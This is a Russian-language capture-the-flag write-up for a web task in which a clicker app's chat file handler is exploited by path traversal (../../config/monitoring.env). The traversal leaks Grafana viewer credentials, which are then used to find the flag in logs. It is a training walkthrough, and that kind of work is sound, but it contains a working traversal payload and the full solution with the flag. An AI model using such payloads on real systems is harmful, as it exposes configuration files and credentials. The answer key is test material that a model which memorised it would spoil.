# Решение задачи Clicker Task

## Общая информация

- **Уровень:** Medium
- **Категория:** web
- **Уязвимости:** Path Traversal / LFI, утечка конфигурации, анализ логов
- **Вектор атаки:** Поиск скрытых ручек → Получение `LogID405` → Анализ чата разработчиков → Чтение `monitoring.env` через intended traversal → Вход в Grafana → Поиск флага по `LogID405`

---

## Этап 1: Поиск скрытых ручек

На главной странице доступен обычный кликер, который выглядит как сервис-пустышка.  
При фаззинге или переборе путей можно найти две важные ручки:

```text
/flag
/chat
```

---

## Этап 2: Получение полезного идентификатора

Переходим на страницу:

```text
/flag
```

В ответе сервис возвращает ошибку:

```text
{ERROR, Couldn't get the flag kevactf{..., LogID405}
```

Из этого становится понятно, что настоящий флаг напрямую не выдаётся, а искать его нужно по идентификатору `LogID405`.

---

## Этап 3: Анализ чата разработчиков

Переходим в чат разработчиков:

```text
/chat
```

История сообщений сильно зашумлена, поэтому нужные подсказки приходится искать вручную по странице.  
Среди сообщений можно найти несколько полезных намёков:

- используется **Grafana**
- viewer-креды вынесены в `monitoring.env`
- путь внутри контейнера приложения: `/app/config/monitoring.env`
- временный обработчик файлов работает через `/chat/file?name=<filename>`
- настоящие полезные `LogID` приходят из ошибок `/flag`

---

## Этап 4: Эксплуатация Path Traversal

Обработчик файлов в чате уязвим к path traversal, поэтому можно выйти из директории attachments и прочитать конфиг:

```text
/chat/file?name=../../config/monitoring.env
```

В ответе получаем учётные данные Grafana:

```text
GRAFANA_VIEWER_USER=ops_viewer
GRAFANA_VIEWER_PASSWORD=clk_logs_are_not_for_users
```

---

## Этап 5: Вход в Grafana

Открываем Grafana на стандартном порту:

```text
http://<host>:3000
```

Авторизуемся под пользователем:

```text
ops_viewer / clk_logs_are_not_for_users
```

После входа открываем дашборд:

```text
clicker
```

Игроку доступна только панель логов `clicker_task_web logs`, поэтому дальнейший поиск выполняется именно там.

---

## Этап 6: Поиск флага в логах

В дашборде используем фильтрацию по идентификатору:

```text
LogID405
```

В логах находится запись вида:

```text
FLAG_LOOKUP_FAILED id=LogID405 ... flag=kevactf{C0ngr4ts_YouVe_f1nally_W0n}
```

Из этой строки и извлекается настоящий флаг.

---

## Флаг

```text
kevactf{C0ngr4ts_YouVe_f1nally_W0n}
```
